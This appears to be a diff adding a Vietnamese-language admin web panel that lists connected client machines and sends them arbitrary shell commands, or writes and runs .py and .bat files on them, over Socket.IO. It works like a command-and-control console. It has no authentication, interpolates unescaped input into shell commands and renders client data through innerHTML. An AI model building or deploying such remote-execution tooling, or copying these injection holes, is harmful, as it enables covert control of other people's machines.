@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #1e1e1e; color: #fff; margin: 0; padding: 20px; }
+        h1 { color: #00ffcc; text-align: center; }
+        .container { max-width: 1200px; margin: auto; display: flex; gap: 20px; }
+        .table-container { flex: 2; background: #2d2d2d; padding: 15px; border-radius: 8px; }
+        .form-container { flex: 1; background: #2d2d2d; padding: 15px; border-radius: 8px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #444; }
+        th { color: #00ffcc; }
+        .online { color: #28a745; font-weight: bold; }
+        .warning { color: #ffc107; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 8px; margin: 5px 0 15px 0; background: #1e1e1e; color: #fff; border: 1px solid #444; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #007acc; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #005f9e; }
+        .log-box { background: #000; color: #0f0; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; border-radius: 4px; margin-top: 15px; border: 1px solid #333; }
+    </style>
+</head>
+<body>
+    <h1>ADMIN DASHBOARD</h1>
+    <div class="container">
+        <!-- Danh sách Client -->
+        <div class="table-container">
+            <h2>Danh sách Client</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Hostname</th>
+                        <th>OS</th>
+                        <th>Room</th>
+                        <th>IP</th>
+                        <th>Online</th>
+                    </tr>
+                </thead>
+                <tbody id="client-list">
+                    <tr><td colspan="6" style="text-align:center;">Đang tải...</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Form điều khiển -->
+        <div class="form-container">
+            <h2>Gửi Lệnh (Client)</h2>
+            <label>Client ID:</label>
+            <input type="text" id="client-id" placeholder="Nhập ID...">
+            
+            <label>Chức năng:</label>
+            <select id="action-type" onchange="toggleFields()">
+                <option value="exec">Chạy lệnh CMD</option>
+                <option value="py">Tạo file .py</option>
+                <option value="bat">Tạo file .bat</option>
+            </select>
+
+            <div id="file-fields" style="display:none;">
+                <label>Tên file:</label>
+                <input type="text" id="filename" placeholder="VD: test.py">
+            </div>
+
+            <label>Nội dung / Lệnh:</label>
+            <textarea id="command-content" rows="3" placeholder="Nhập nội dung..."></textarea>
+            <button onclick="sendCommand()">GỬI LỆNH</button>
+
+            <hr style="border-color: #444; margin: 20px 0;">
+            
+            <h2>Gửi Thông Báo Toàn Server</h2>
+            <textarea id="broadcast-msg" rows="2" placeholder="Nhập thông báo..."></textarea>
+            <button onclick="sendBroadcast()" style="background-color: #28a745;">GỬI THÔNG BÁO</button>
+
+            <h2>Kết quả / Log</h2>
+            <div class="log-box" id="log-box"></div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io({ transports: ["polling", "websocket"] });
+
+        socket.on("connect", () => {
+            log("✅ Đã kết nối tới Server Render");
+            socket.emit("register", {"type": "admin"});
+        });
+
+        socket.on("registered", (data) => {
+            log("🔑 Đăng ký Admin thành công");
+            setInterval(() => {
+                socket.emit("admin_command", {"action": "list"});
+            }, 2000);
+        });
+
+        socket.on("admin_event", (msg) => {
+            if (msg.event === "init" || msg.event === "clients") {
+                updateTable(msg.clients);
+            } else if (msg.event === "exec_result") {
+                log(`📨 KẾT QUẢ TỪ ${msg.client_id}:\n${msg.output}`, "#00ffcc");
+            } else if (msg.event === "client_joined") {
+                log(`🟢 Client mới: ${msg.client} (${msg.client_id})`);
+            } else if (msg.event === "client_left") {
+                log(`🔴 Client rời: ${msg.client} (${msg.client_id})`);
+            } else if (msg.event === "broadcast_sent") {
+                log(`📢 Đã gửi thông báo toàn server: ${msg.message}`, "#28a745");
+            }
+        });
+
+        function updateTable(clients) {
+            const tbody = document.getElementById("client-list");
+            if (!clients || clients.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">Chưa có ai kết nối</td></tr>';
+                return;
+            }
+            tbody.innerHTML = clients.map(c => {
+                const statusClass = c.online_for < 5 ? "online" : "warning";
+                return `<tr>
+                    <td>${c.client_id}</td>
+                    <td>${c.hostname}</td>
+                    <td>${c.os}</td>
+                    <td>${c.room}</td>
+                    <td>${c.ip}</td>
+                    <td class="${statusClass}">${c.online_for}s</td>
+                </tr>`;
+            }).join('');
+        }
+
+        function toggleFields() {
+            const type = document.getElementById("action-type").value;
+            document.getElementById("file-fields").style.display = (type === "exec") ? "none" : "block";
+        }
+
+        function sendCommand() {
+            const cid = document.getElementById("client-id").value.trim();
+            const type = document.getElementById("action-type").value;
+            const filename = document.getElementById("filename").value.trim();
+            const content = document.getElementById("command-content").value.trim();
+
+            if (!cid) return alert("Nhập Client ID!");
+            
+            let cmd = "";
+            if (type === "exec") {
+                cmd = content;
+            } else if (type === "py") {
+                cmd = `python -c "open('${filename}', 'w', encoding='utf-8').write('''${content}''')" && python ${filename}`;
+            } else if (type === "bat") {
+                cmd = `echo ${content} > ${filename} && start ${filename}`;
+            }
+
+            socket.emit("admin_command", {
+                "action": "exec",
+                "client_id": cid,
+                "command": cmd
+            });
+            log(`📤 Đã gửi lệnh tới ${cid}`, "#ffc107");
+        }
+
+        function sendBroadcast() {
+            const msg = document.getElementById("broadcast-msg").value.trim();
+            if (!msg) return alert("Vui lòng nhập nội dung thông báo!");
+            
+            socket.emit("admin_command", {
+                "action": "broadcast",
+                "message": msg
+            });
+            
+            document.getElementById("broadcast-msg").value = ""; 
+        }
+
+        function log(message, color = "#0f0") {
+            const box = document.getElementById("log-box");
+            const time = new Date().toLocaleTimeString();
+            box.innerHTML += `<div style="color:${color}">[${time}] ${message}</div>`;
+            box.scrollTop = box.scrollHeight;
+        }
+    </script>
+</body>
+</html>
